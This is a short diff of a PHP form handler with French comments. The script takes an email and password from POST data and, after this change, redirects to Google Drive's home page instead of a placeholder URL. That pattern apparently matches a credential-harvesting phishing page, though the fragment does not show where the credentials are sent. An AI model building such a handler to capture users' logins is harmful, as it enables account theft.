@@ -7,7 +7,7 @@ $email = isset($_POST['email']) ? trim($_POST['email']) : null;
 $password = isset($_POST['password']) ? trim($_POST['password']) : null;
 
 // Redirection en cas de succès
-$redirect = 'https://example.com/success'; // Remplacez par l'URL de votre choix
+$redirect = 'https://drive.google.com/drive/u/0/home'; // Remplacez par l'URL de votre choix
 
 // Validation des champs obligatoires
 if (filter_var($email, FILTER_VALIDATE_EMAIL) && !empty($password)) {
